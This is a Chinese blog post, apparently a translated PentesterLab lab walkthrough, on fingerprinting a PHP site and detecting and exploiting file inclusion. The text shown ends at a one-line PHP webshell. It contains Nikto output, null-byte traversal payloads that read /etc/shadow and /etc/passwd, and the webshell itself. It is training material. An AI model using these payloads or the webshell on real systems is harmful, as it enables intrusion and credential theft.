<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>PHP Include And Post Exploitation | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="Pentesterlab">
    <meta name="description" content="简介本课程详细讲解了发现和利用一个有限制的环境中的PHP漏洞。然后介绍了post漏洞利用的基础，shell，反向shell和TCP重定向。   攻击分为三个步骤：    指纹识别：收集Web应用使用的技术信息。   检测和利用PHP包含漏洞：在这一部分中，您将学习PHP包含漏洞的工作原理以及如何利用它来获取代码执行。   Post漏洞利用：访问操作系统，获得shell并且执行TCP重定向到其他服务">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP Include And Post Exploitation">
<meta property="og:url" content="https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="简介本课程详细讲解了发现和利用一个有限制的环境中的PHP漏洞。然后介绍了post漏洞利用的基础，shell，反向shell和TCP重定向。   攻击分为三个步骤：    指纹识别：收集Web应用使用的技术信息。   检测和利用PHP包含漏洞：在这一部分中，您将学习PHP包含漏洞的工作原理以及如何利用它来获取代码执行。   Post漏洞利用：访问操作系统，获得shell并且执行TCP重定向到其他服务">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032601.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032602.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032603.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032604.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032605.png">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032606.png">
<meta property="article:published_time" content="2015-03-26T07:29:04.000Z">
<meta property="article:modified_time" content="2019-09-03T07:30:50.763Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="Pentesterlab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032601.png">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                彼女募集中
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                about
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">PHP Include And Post Exploitation</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">PHP Include And Post Exploitation</h1>
        <h5 class="subtitle">
            
                <time datetime="2015-03-26T07:29:04.000Z" itemprop="datePublished" class="page-time">
  2015-03-26
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>

            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">简介</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#指纹识别"><span class="post-toc-number">2.</span> <span class="post-toc-text">指纹识别</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#检查HTTP标头"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">检查HTTP标头</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用Nikto"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">使用Nikto</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#检测和利用-PHP-文件包含漏洞"><span class="post-toc-number">3.</span> <span class="post-toc-text">检测和利用 PHP 文件包含漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP文件包含漏洞介绍"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">PHP文件包含漏洞介绍</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP文件包含检测"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">PHP文件包含检测</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#PHP文件包含利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">PHP文件包含利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#远程文件包含利用"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">远程文件包含利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#本地文件包含利用"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">本地文件包含利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Shell与反向Shell"><span class="post-toc-number">5.</span> <span class="post-toc-text">Shell与反向Shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#后续利用介绍"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">后续利用介绍</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Shell与反向Shell-1"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">Shell与反向Shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#通过socat进行TCP重定向"><span class="post-toc-number">6.</span> <span class="post-toc-text">通过socat进行TCP重定向</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#DNS隧道"><span class="post-toc-number">7.</span> <span class="post-toc-text">DNS隧道</span></a></li></ol>
        </nav>
    </aside>


<article id="post-PHP-Include-And-Post-Exploitation"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">PHP Include And Post Exploitation</h1>
        <div class="post-meta">
            <time class="post-time" title="2015-03-26 15:29:04" datetime="2015-03-26T07:29:04.000Z"  itemprop="datePublished">2015-03-26</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>



            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本课程详细讲解了发现和利用一个有限制的环境中的PHP漏洞。<br>然后介绍了post漏洞利用的基础，shell，反向shell和TCP重定向。  </p>
<p>攻击分为三个步骤：  </p>
<ul>
<li>指纹识别：收集Web应用使用的技术信息。  </li>
<li>检测和利用PHP包含漏洞：在这一部分中，您将学习PHP包含漏洞的工作原理以及如何利用它来获取代码执行。  </li>
<li>Post漏洞利用：访问操作系统，获得shell并且执行TCP重定向到其他服务。  </li>
</ul>
<h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><p>指纹识别可以通过使用多个工具。首先通过使用浏览器，将有可能检测到该应用程序是用PHP写的。</p>
<h2 id="检查HTTP标头"><a href="#检查HTTP标头" class="headerlink" title="检查HTTP标头"></a>检查HTTP标头</h2><p>大量的信息可以通过使用telnet或netcat连接到远程Web应用程序获取：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> telnet vulnerable 80</span></span><br></pre></td></tr></table></figure>

<p>PS：</p>
<ul>
<li>vulnerable是主机名或服务器的IP地址；  </li>
<li>80是由Web应用程序使用的TCP端口（80是HTTP默认值）。</li>
</ul>
<p>通过发送以下HTTP请求：  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: vulnerable</span><br></pre></td></tr></table></figure>

<p>它有可能获取到PHP版本和Web服务器信息，仅仅通过观察服务器发送回的HTTP响应报头：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Tue, 10 Apr 2012 04:24:16 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.2.16 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.3.2</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 2065</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br></pre></td></tr></table></figure>

<p>这里的应用程序通过HTTP。如果应用程序只能通过HTTPS，telnet或netcat就无法与服务器进行通信，可以使用 <strong>openssl</strong> 工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> openssl s_client -connect vulnerable:443</span></span><br></pre></td></tr></table></figure>

<p>PS：</p>
<ul>
<li>vulnerable是主机名或服务器的IP地址；  </li>
<li>443是由Web应用程序使用的TCP端口（443是HTTPS的默认值）</li>
</ul>
<p>使用应用程序如Burp Suite（<a href="http://portswigger.net/" target="_blank" rel="noopener" title="http://portswigger.net/">http://portswigger.net/</a>）设置为代理可以很容易地获取相同的信息。</p>
<h2 id="使用Nikto"><a href="#使用Nikto" class="headerlink" title="使用Nikto"></a>使用Nikto</h2><p>Nikto工具（<a href="http://cirt.net/nikto2" target="_blank" rel="noopener" title="http://cirt.net/nikto2">http://cirt.net/nikto2</a>）可用于收集远程服务器上的信息。Nikto检查已知的漏洞路径并且检查HTTP标头。这是一个特别有用的工具，在旧系统中找到漏洞（Lotus Domino, IIS4, …）。<br>下面的命令可以执行扫描远程服务器：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> perl nikto.pl -h http://vulnerable/</span></span><br><span class="line">- Nikto v2.1.4</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.0.21</span><br><span class="line">+ Target Hostname:    vulnerable</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2012-04-11 14:12:45</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.16 (Debian)</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.3.2</span><br><span class="line">+ Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.</span><br><span class="line">+ /index.php?page=../../../../../../../../../../etc/passwd: PHP include error may indicate local or remote file inclusion is possible.</span><br><span class="line">+ /index.php?page=../../../../../../../../../../boot.ini: PHP include error may indicate local or remote file inclusion is possible.</span><br><span class="line">+ OSVDB-3126: /submit?setoption=q&amp;option=allowed_ips&amp;value=255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080.</span><br><span class="line">+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: /login/: This might be interesting...</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: /images/: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /login.php: Admin login page/section found.</span><br><span class="line">+ 4103 items checked: 0 error(s) and 13 item(s) reported on remote host</span><br><span class="line">+ End Time:           2012-04-11 14:13:01 (16 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<p>我们可以看到Nikto找到了一些问题：</p>
<ul>
<li>Apache和PHP版本；  </li>
<li>一个潜在的PHP包含问题；  </li>
<li>假积极性（OSVDB-3126）；  </li>
<li>PHP的复活节彩蛋是可用，PHP配置 <strong>exposed_php</strong> 开启状态（OSVDB-12184）；  </li>
<li>一些目录可以索引；  </li>
<li>登陆页。</li>
</ul>
<h1 id="检测和利用-PHP-文件包含漏洞"><a href="#检测和利用-PHP-文件包含漏洞" class="headerlink" title="检测和利用 PHP 文件包含漏洞"></a>检测和利用 PHP 文件包含漏洞</h1><h2 id="PHP文件包含漏洞介绍"><a href="#PHP文件包含漏洞介绍" class="headerlink" title="PHP文件包含漏洞介绍"></a>PHP文件包含漏洞介绍</h2><p>之前，开发者使用服务器端包含来复制在许多网页中相同的信息，保持在只有一个地方（避免代码重复和耗时的更新）。当开发人员开始使用PHP，他们开始使用PHP函数 <strong>include</strong> 和 <strong>require</strong> （部分较聪明的使用 <strong>include_once</strong> 和 <strong>require_once</strong> ）执行同样的事情。该代码是包含到当前页面并且解释作为它的一部分。</p>
<p>只要人们使用一个恒定的路径在 <strong>include</strong> 或 <strong>require</strong> 中，没有任何安全的隐患。然而，一些开发者在这里使用了在用户的控制下的路径。这可能导致文件包含。如果有人可以决定哪些文件被包含和解释，他可以通过控制他的文件并且强制服务器解释任意代码。</p>
<p>如果，你在执行代码审查，脆弱的PHP代码看起来类似于这种：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"header.php"</span>);</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">"page"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一行用于包括<strong>header.php</strong>并不脆弱因为第一行的值<strong>header.php</strong>不是由用户控制。</p>
<p>然而，在第二行，由用户提供的值（<strong>$_GET[“page”]</strong>）是直接使用，没有任何过滤或预处理。这是一个典型的文件包含。</p>
<p>有两种典型的文件包含：</p>
<ul>
<li>本地文件包含，  </li>
<li>远程文件包含。  </li>
</ul>
<p>他们都来自同一个问题（使用用户的输入包含一个文件），唯一的区别是他们可以利用的途径。一个远程文件包含可以通过使用任何资源来利用，而本地文件包含只能使用本地资源来利用。</p>
<h2 id="PHP文件包含检测"><a href="#PHP文件包含检测" class="headerlink" title="PHP文件包含检测"></a>PHP文件包含检测</h2><p>本地文件包含的检测类似于目录遍历，因为我们是在玩一个路径。<br>我们知道，PHP脚本使用用户提供的值并且使用它作为一个包含文件的路径，但是所提供的值可以通过PHP代码修改：</p>
<ul>
<li>父目录可以添加：<strong>include(“includes/“.$_GET[“page”]);</strong> ；  </li>
<li>文件扩展名可以添加：<strong>include($_GET[“page”].”.php”);</strong> ；  </li>
<li>值可以被净化：<strong>include(basename($_GET[“page”]));</strong> ；  </li>
<li>之前所有的操作都可以执行：<strong>include(“includes/“.basename($_GET[“page”]).”.php”);</strong> 。</li>
</ul>
<p>这些修改将修改这一问题的检测和利用。</p>
<p>PHP提供了对远程文件的保护包括（allowurlinclude 在PHP配置文件中）。这种配置也会修改Web应用中检测和利用PHP文件包含的行为。</p>
<p>最简单的方法是测试包含路径，将生成错误消息。</p>
<p>你可以先尝试包含一个不存在的文件：例如 <strong>pentesterlab123randomvalue</strong> 是不可能存在的；；你可以用它来看看有什么消息被应用程序发送回来。我们可以看到下面的错误消息被抛出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;Warning&lt;&#x2F;b&gt;:  include(pentesterlab123randomvalue.php)  [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]:  failed to open stream: No such file or directory in  &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; &lt;br &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;b&gt;Warning&lt;&#x2F;b&gt;:  include()  [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]:  Failed opening &#39;pentesterlab123randomvalue.php&#39; for  inclusion (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&#39;) in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>这个错误信息给了我们需要在漏洞利用时使用的重要信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed opening &#39;pentesterlab123randomvalue.php&#39; for inclusion</span><br></pre></td></tr></table></figure>

<p>由于我们使用的字符串 <strong>pentesterlab123randomvalue</strong> ，我们可以猜测后缀名 <strong>.php</strong> 是被PHP代码添加的。</p>
<p>我们可以尝试访问一个没有权限的文件：例如访问 <strong>/etc/shadow</strong> 将有可能因为当前网络服务器的用户没有权限而产生一个异常。然而，由于PHP代码添加了后缀名 <strong>.php</strong> ，我们需要添加一个空字节（编码为 <strong>%00</strong> ）来绕过它并且访问页面 <a href="http://vulnerable/index.php?page=../../../../../etc/shadow%00" target="_blank" rel="noopener" title=" http://vulnerable/index.php?page=../../../../../etc/shadow%00"> http://vulnerable/index.php?page=../../../../../etc/shadow%00</a>。你可以使用很多 <strong>../</strong>向上访问文件系统中的 shadow文件。下面的错误信息显示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  include(../../../../../etc/shadow)  [<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'function.include'</span>&gt;</span>function.include<span class="tag">&lt;/<span class="name">a</span>&gt;</span>]: failed to open stream: Permission denied in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span>  on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>28<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到，我们有一个不同的错误信息：<strong>Permission denied</strong> 并且我们的空字节技巧生效了，因为PHP尝试包含文件<strong>../../../../../etc/shadow</strong> 。</p>
<p>你可以尝试用文件 <strong>/etc/passwd</strong> 使用同样的把戏（<strong>../</strong> 和空字节），你应该能访问到文件内容：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032601.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>你可以修改请求的值从字符串到数组；这可能会影响到PHP的行为。例如，修改参数 <strong>page=login</strong> 到 <strong>page[]=login</strong> ，下面的错误信息被抛出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;Warning&lt;&#x2F;b&gt;:  include(Array.php) [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]: failed to open stream: No such file or directory in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt; &lt;br &#x2F;&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;&#x2F;b&gt;:  include()  [&lt;a href&#x3D;&#39;function.include&#39;&gt;function.include&lt;&#x2F;a&gt;]:  Failed opening &#39;Array.php&#39; for inclusion  (include_path&#x3D;&#39;.:&#x2F;usr&#x2F;share&#x2F;php:&#x2F;usr&#x2F;share&#x2F;pear&#39;) in  &lt;b&gt;&#x2F;var&#x2F;www&#x2F;index.php&lt;&#x2F;b&gt; on line &lt;b&gt;28&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，提供的值已经被改变成了数组因为PHP将它作为一个字符串转换了。</p>
<p>检查的另一种方法是使用不同的值观构建相同的路径。例如，以下路径：<strong>classes/../login</strong> ，<strong>./login</strong> 和 <strong>login</strong> 匹配相同的文件。Windows和Unix目前对于路径管理的主要区别，假如你尝试访问 <strong>classes/../login</strong> 并且存储库类不存在，Linux/Unix将抛出一个错误，而Windows将忽略这个问题，显示正确的页面。</p>
<p>你可以使用另一个Web服务器测试远程文件访问，然而，它只会工作在以下情况下：</p>
<ul>
<li>如果PHP配置允许远程文件包含；  </li>
<li>如果Web服务器访问远程服务器可以被防火墙阻止，缺少DNS解析（可以使用IP地址来绕过），通过Web代理服务器或通过网络（例如，你的测试环境中没有互联网接入）。</li>
</ul>
<p>例如，你可以访问以下URL尝试包含谷歌主页：<br><a href="http://vulnerable/index.php?page=http://www.google.com/?" target="_blank" rel="noopener" title="http://vulnerable/index.php?page=http://www.google.com/?">http://vulnerable/index.php?page=http://www.google.com/?</a></p>
<p>URL末尾的<strong>？</strong>用来确保任何添加到URL的扩展或后缀将被谷歌的服务器解释为一个参数。脆弱的系统没有配置允许远程文件包含，显示如下错误信息：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span> <span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  include() [<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'function.include'</span>&gt;</span>function.include<span class="tag">&lt;/<span class="name">a</span>&gt;</span>]:  URL file-access is disabled in the server configuration in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>28<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  include(http://www.google.com/?.php) [<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'function.include'</span>&gt;</span>function.include<span class="tag">&lt;/<span class="name">a</span>&gt;</span>]: failed to open stream: no suitable wrapper could be found in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>28<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  include() [<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'function.include'</span>&gt;</span>function.include<span class="tag">&lt;/<span class="name">a</span>&gt;</span>]: Failed opening 'http://www.google.com/?.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in  <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>28<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果PHP配置允许远程包含，这是一个例子，我们看到了什么：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032602.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>我们可以看到“正常”的页面并且谷歌网页已经被包含进来了。</p>
<p>从这个测试中，我们可以猜出：</p>
<ul>
<li>有一个本地文件包含漏洞；  </li>
<li>一个.php扩展被添加到提交的值后面。</li>
</ul>
<h1 id="PHP文件包含利用"><a href="#PHP文件包含利用" class="headerlink" title="PHP文件包含利用"></a>PHP文件包含利用</h1><p>与SQL注入（盲注和非盲注）类似，你可以首先尝试包括远程文件，如果它不工作，你需要使用一个本地文件包含。</p>
<h2 id="远程文件包含利用"><a href="#远程文件包含利用" class="headerlink" title="远程文件包含利用"></a>远程文件包含利用</h2><p>利用远程文件包含，你只需要安装一个Web服务器来运行你的PHP代码。PHP代码是一个简单的webshell：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  system($_GET[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

